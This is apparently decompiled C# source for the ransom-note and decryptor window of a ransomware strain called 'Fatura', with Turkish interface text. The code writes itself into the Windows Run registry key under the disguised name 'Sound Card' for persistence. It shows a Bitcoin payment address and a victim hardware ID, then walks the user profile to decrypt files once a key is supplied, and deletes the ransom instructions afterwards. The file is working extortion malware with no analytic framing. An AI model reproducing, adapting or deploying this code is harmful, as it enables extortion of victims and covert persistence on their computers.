using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace FaturaDecryptor;

public class FaturaDecryptor : Form
{
	private IContainer components;

	private RichTextBox FaturaMessageTxt;

	private Label label1;

	private Label PersonalIDTxt;

	private Label label2;

	private Label BitcoinAdressLbl;

	private Button CopyPersonalIDBtn;

	private Button CopyBitcoinAddressBtn;

	private Button DecryptBtn;

	private PictureBox pictureBox1;

	public FaturaDecryptor()
	{
		InitializeComponent();
		if (!File.Exists(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "temp.aes")))
		{
			Environment.Exit(1);
		}
		if (!FaturaDecryptorIsNotRunning())
		{
			Environment.Exit(1);
		}
	}

	private void FaturaGUI_Load(object sender, EventArgs e)
	{
		RegistryKey? registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey!.SetValue("Sound Card", Assembly.GetEntryAssembly()!.Location);
		registryKey!.Close();
		((Control)FaturaMessageTxt).set_Text(((Control)FaturaMessageTxt).get_Text().Replace("[HWID goes here]", GetHwid()));
		((Control)FaturaMessageTxt).set_Text(((Control)FaturaMessageTxt).get_Text().Replace("[bitcoin address]", "bc1qwp2pa32m0djz8lhfzqhl7zvuq5nz4nen2azyyk5eds43lku7834qfk6den"));
		((Control)PersonalIDTxt).set_Text(GetHwid());
	}

	private string GetHwid()
	{
		return new UHWIDEngine().SimpleUID;
	}

	private void CopyPersonalIDBtn_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(((Control)PersonalIDTxt).get_Text());
	}

	private void CopyBitcoinAddressBtn_Click(object sender, EventArgs e)
	{
		Clipboard.SetText(((Control)BitcoinAdressLbl).get_Text());
	}

	private void DecryptBtn_Click(object sender, EventArgs e)
	{
		//IL_001e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Invalid comparison between Unknown and I4
		KeyValidationWindow keyValidationWin = new KeyValidationWindow();
		((Form)keyValidationWin).ShowDialog();
		if (keyValidationWin.PublicPrivateKey != string.Empty && (int)MessageBox.Show("Şifre çözme işlemi biraz zaman alabilir. Lütfen diğer programları kapatmayın ve şifre çözme işleminin bitmesini sabırla bekleyin.", "Şifre çözme işlemi yakında başlayacak", (MessageBoxButtons)1, (MessageBoxIcon)64) == 1)
		{
			Thread thread = new Thread((ThreadStart)delegate
			{
				RunDecryptor(keyValidationWin.PublicPrivateKey);
			});
			thread.Name = "DecryptionProcessThread";
			thread.Start();
		}
	}

	private void RunDecryptor(string publicPrivateKey)
	{
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0137: Unknown result type (might be due to invalid IL or missing references)
		//IL_028a: Unknown result type (might be due to invalid IL or missing references)
		DecryptionProgressBarForm decProForm = new DecryptionProgressBarForm();
		foreach (Form item in (ReadOnlyCollectionBase)(object)Application.get_OpenForms())
		{
			Form form = item;
			if (((Control)form).get_Text() == "Fatura 1.3")
			{
				new Thread((ThreadStart)delegate
				{
					//IL_0011: Unknown result type (might be due to invalid IL or missing references)
					((Form)decProForm).ShowDialog((IWin32Window)(object)form);
				}).Start();
				break;
			}
		}
		string path = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "temp.aes");
		string path2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "Kurtarma Talimatı.txt");
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string path3 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "encKey.aes");
		FaturaClass faturaClass = new FaturaClass();
		byte[] array = null;
		List<string> list = null;
		try
		{
			array = Convert.FromBase64String(File.ReadAllText(path3));
			faturaClass = new FaturaClass(Encoding.Unicode.GetString(faturaClass.RsaDecryption(array, 1024, publicPrivateKey)));
			list = GetFiles(environmentVariable, "*.*");
		}
		catch (Exception ex)
		{
			((Form)decProForm).Close();
			MessageBox.Show(ex.Message, "Şifre çözme işlemi başarısız oldu", (MessageBoxButtons)0, (MessageBoxIcon)64);
		}
		foreach (string item2 in list)
		{
			try
			{
				string empty = string.Empty;
				FileInfo fileInfo = new FileInfo(item2);
				if (fileInfo.Extension == ".aes")
				{
					if (!fileInfo.Name.Contains(".txt") && !fileInfo.Name.Contains(".md"))
					{
						faturaClass.DecryptFilePartially(fileInfo.FullName);
						empty = fileInfo.Name.Replace(".partially.aes", "");
						File.Move(fileInfo.FullName, Path.Combine(fileInfo.DirectoryName, empty));
					}
					else
					{
						faturaClass.DecryptFileFully(fileInfo.FullName);
						empty = fileInfo.Name.Replace(".fully.aes", "");
						File.Move(fileInfo.FullName, Path.Combine(fileInfo.DirectoryName, empty));
					}
				}
			}
			catch (Exception)
			{
			}
		}
		if (File.Exists(path))
		{
			File.Delete(path);
		}
		if (File.Exists(path3))
		{
			File.Delete(path3);
		}
		if (File.Exists(path2))
		{
			File.Delete(path2);
		}
		((Form)decProForm).Close();
		MessageBox.Show("Şifre çözme tamamlandı! ", " Şimdi dosyalarınızı geri alabilirsiniz !!", (MessageBoxButtons)0, (MessageBoxIcon)64);
		Environment.Exit(0);
	}

	private List<string> GetFiles(string path, string pattern)
	{
		List<string> list = new List<string>();
		try
		{
			list.AddRange(Directory.GetFiles(path, pattern, SearchOption.TopDirectoryOnly));
			string[] directories = Directory.GetDirectories(path);
			foreach (string path2 in directories)
			{
				list.AddRange(GetFiles(path2, pattern));
			}
			return list;
		}
		catch (Exception)
		{
			return list;
		}
	}

	private bool FaturaDecryptorIsNotRunning()
	{
		bool createdNew;
		Mutex obj = new Mutex(initiallyOwned: true, "FaturaWalkerDecryptor90912", out createdNew);
		if (!createdNew)
		{
			return false;
		}
		GC.KeepAlive(obj);
		return true;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_00a8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b2: Expected O, but got Unknown
		//IL_0141: Unknown result type (might be due to invalid IL or missing references)
		//IL_014b: Expected O, but got Unknown
		//IL_01d1: Unknown result type (might be due to invalid IL or missing references)
		//IL_01db: Expected O, but got Unknown
		//IL_0262: Unknown result type (might be due to invalid IL or missing references)
		//IL_026c: Expected O, but got Unknown
		//IL_02ea: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f4: Expected O, but got Unknown
		//IL_0374: Unknown result type (might be due to invalid IL or missing references)
		//IL_037e: Expected O, but got Unknown
		//IL_041f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0429: Expected O, but got Unknown
		//IL_04cd: Unknown result type (might be due to invalid IL or missing references)
		//IL_04d7: Expected O, but got Unknown
		//IL_0582: Unknown result type (might be due to invalid IL or missing references)
		//IL_058c: Expected O, but got Unknown
		//IL_06ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_06d8: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(FaturaDecryptor));
		FaturaMessageTxt = new RichTextBox();
		label1 = new Label();
		PersonalIDTxt = new Label();
		label2 = new Label();
		BitcoinAdressLbl = new Label();
		CopyPersonalIDBtn = new Button();
		CopyBitcoinAddressBtn = new Button();
		DecryptBtn = new Button();
		pictureBox1 = new PictureBox();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)FaturaMessageTxt).set_Anchor((AnchorStyles)15);
		((Control)FaturaMessageTxt).set_Font(new Font("Segoe UI", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)162));
		((Control)FaturaMessageTxt).set_Location(new Point(12, 12));
		((Control)FaturaMessageTxt).set_Name("FaturaMessageTxt");
		((Control)FaturaMessageTxt).set_Size(new Size(488, 297));
		((Control)FaturaMessageTxt).set_TabIndex(0);
		((Control)FaturaMessageTxt).set_Text(componentResourceManager.GetString("FaturaMessageTxt.Text"));
		((Control)label1).set_Anchor((AnchorStyles)6);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Segoe UI", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)162));
		((Control)label1).set_Location(new Point(9, 324));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(101, 15));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Kişisel Kimliğiniz:");
		((Control)PersonalIDTxt).set_Anchor((AnchorStyles)6);
		((Control)PersonalIDTxt).set_AutoSize(true);
		((Control)PersonalIDTxt).set_Font(new Font("Segoe UI", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)162));
		((Control)PersonalIDTxt).set_Location(new Point(116, 324));
		((Control)PersonalIDTxt).set_Name("PersonalIDTxt");
		((Control)PersonalIDTxt).set_Size(new Size(49, 15));
		((Control)PersonalIDTxt).set_TabIndex(2);
		((Control)PersonalIDTxt).set_Text("[HWID]");
		((Control)label2).set_Anchor((AnchorStyles)10);
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("Segoe UI", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)162));
		((Control)label2).set_Location(new Point(505, 324));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(87, 15));
		((Control)label2).set_TabIndex(3);
		((Control)label2).set_Text("Bitcoin Adresi:");
		((Control)BitcoinAdressLbl).set_Anchor((AnchorStyles)10);
		((Control)BitcoinAdressLbl).set_Font(new Font("Segoe UI", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)162));
		((Control)BitcoinAdressLbl).set_Location(new Point(591, 324));
		((Control)BitcoinAdressLbl).set_Name("BitcoinAdressLbl");
		((Control)BitcoinAdressLbl).set_Size(new Size(229, 38));
		((Control)BitcoinAdressLbl).set_TabIndex(4);
		((Control)BitcoinAdressLbl).set_Text("bc1qwp2pa32m0djz8lhfzqhl7zvuq5nz4nen2azyyk5eds43lku7834qfk6den");
		((Control)CopyPersonalIDBtn).set_Anchor((AnchorStyles)6);
		((Control)CopyPersonalIDBtn).set_Font(new Font("Segoe UI", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)162));
		((Control)CopyPersonalIDBtn).set_Location(new Point(12, 355));
		((Control)CopyPersonalIDBtn).set_Name("CopyPersonalIDBtn");
		((Control)CopyPersonalIDBtn).set_Size(new Size(339, 34));
		((Control)CopyPersonalIDBtn).set_TabIndex(5);
		((Control)CopyPersonalIDBtn).set_Text("Kişisel Kimliğini Kopyala");
		((ButtonBase)CopyPersonalIDBtn).set_UseVisualStyleBackColor(true);
		((Control)CopyPersonalIDBtn).add_Click((EventHandler)CopyPersonalIDBtn_Click);
		((Control)CopyBitcoinAddressBtn).set_Anchor((AnchorStyles)10);
		((Control)CopyBitcoinAddressBtn).set_Font(new Font("Segoe UI", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)162));
		((Control)CopyBitcoinAddressBtn).set_Location(new Point(465, 355));
		((Control)CopyBitcoinAddressBtn).set_Name("CopyBitcoinAddressBtn");
		((Control)CopyBitcoinAddressBtn).set_Size(new Size(355, 34));
		((Control)CopyBitcoinAddressBtn).set_TabIndex(6);
		((Control)CopyBitcoinAddressBtn).set_Text("Bitcoin Adresini Kopyala");
		((ButtonBase)CopyBitcoinAddressBtn).set_UseVisualStyleBackColor(true);
		((Control)CopyBitcoinAddressBtn).add_Click((EventHandler)CopyBitcoinAddressBtn_Click);
		((Control)DecryptBtn).set_Anchor((AnchorStyles)14);
		((Control)DecryptBtn).set_Font(new Font("Segoe UI", 9f, (FontStyle)1, (GraphicsUnit)3, (byte)162));
		((Control)DecryptBtn).set_Location(new Point(12, 395));
		((Control)DecryptBtn).set_Name("DecryptBtn");
		((Control)DecryptBtn).set_Size(new Size(808, 37));
		((Control)DecryptBtn).set_TabIndex(7);
		((Control)DecryptBtn).set_Text("Şifre çözme anahtarınız var mı? Harika, dosyalarınızın şifresini çözmek için buraya tıklayın !!");
		((ButtonBase)DecryptBtn).set_UseVisualStyleBackColor(true);
		((Control)DecryptBtn).add_Click((EventHandler)DecryptBtn_Click);
		((Control)pictureBox1).set_Anchor((AnchorStyles)11);
		((Control)pictureBox1).set_BackColor(Color.White);
		pictureBox1.set_Image((Image)componentResourceManager.GetObject("pictureBox1.Image"));
		((Control)pictureBox1).set_Location(new Point(508, 12));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(312, 297));
		pictureBox1.set_SizeMode((PictureBoxSizeMode)4);
		pictureBox1.set_TabIndex(8);
		pictureBox1.set_TabStop(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(832, 438));
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)DecryptBtn);
		((Control)this).get_Controls().Add((Control)(object)CopyBitcoinAddressBtn);
		((Control)this).get_Controls().Add((Control)(object)CopyPersonalIDBtn);
		((Control)this).get_Controls().Add((Control)(object)BitcoinAdressLbl);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)PersonalIDTxt);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)FaturaMessageTxt);
		((Form)this).set_FormBorderStyle((FormBorderStyle)1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("FaturaDecryptor");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Fatura");
		((Form)this).add_Load((EventHandler)FaturaGUI_Load);
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
